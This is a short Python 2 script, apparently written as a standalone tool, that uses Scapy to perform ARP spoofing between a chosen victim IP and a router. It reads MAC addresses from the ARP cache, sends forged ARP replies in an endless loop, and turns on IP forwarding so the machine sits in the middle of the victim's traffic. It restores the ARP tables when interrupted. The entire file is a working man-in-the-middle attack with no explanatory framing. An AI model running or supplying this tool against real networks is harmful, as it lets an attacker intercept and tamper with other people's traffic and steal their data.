from scapy.all import *
import argparse
import os
import sys

def parse_args():
	parser = argparse.ArgumentParser()
	parser.add_argument("-v", "--victimIP", help="Choose the victim IP address. Example: -v 192.168.0.5")
	parser.add_argument("-r", "--routerIP", help="Choose the router IP address. Example: -r 192.168.0.1")
	return parser.parse_args()

def find_mac_addr(ip):
	mac = open("/proc/net/arp", "r").read().split(ip+" ")[1]
	mac = mac.split()[2]
	return mac

def arp_poison(v_ip, r_ip, v_mac, r_mac):
	send(ARP(op = 2, psrc = r_ip, pdst = v_ip, hwdst = v_mac))
	send(ARP(op = 2, psrc = v_ip, pdst = r_ip, hwdst = r_mac))

def arp_restore(v_ip, r_ip, v_mac, r_mac):
	send(ARP(op = 2, psrc = r_ip, pdst = v_ip, hwdst = "ff:ff:ff:ff:ff:ff"))
	send(ARP(op = 2, psrc = v_ip, pdst = r_ip, hwdst = "ff:ff:ff:ff:ff:ff"))

argv = parse_args()
victim_IP = argv.victimIP
router_IP = argv.routerIP
victim_MAC = find_mac_addr(argv.victimIP)
router_MAC = find_mac_addr(argv.routerIP)

if os.getuid() != 0 :
	sys.exit("[!] please run as root")

print "[*] victim IP address : " + victim_IP
print "[*] router IP address : " + router_IP
print "[*] victim MAC address : " + victim_MAC
print "[*] router Mac address : " + router_MAC
print "[*] ARP poisoning Test"
arp_poison(victim_IP, router_IP, victim_MAC, router_MAC)
print "[*] ARP poisoning SUCCESS"
print "[*] Set IP forwarding enabled"
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
print "[*] Start ARP Spoofing....."
while True:
	try :
		arp_poison(victim_IP, router_IP, victim_MAC, router_MAC)
		time.sleep(1.5)
	except KeyboardInterrupt:
		print "[*] Set IP forwarding disabled"
		os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
		arp_restore(victim_IP, router_IP, victim_MAC, router_MAC)
		sys.exit("[!] Exit ARP Spoofing.....")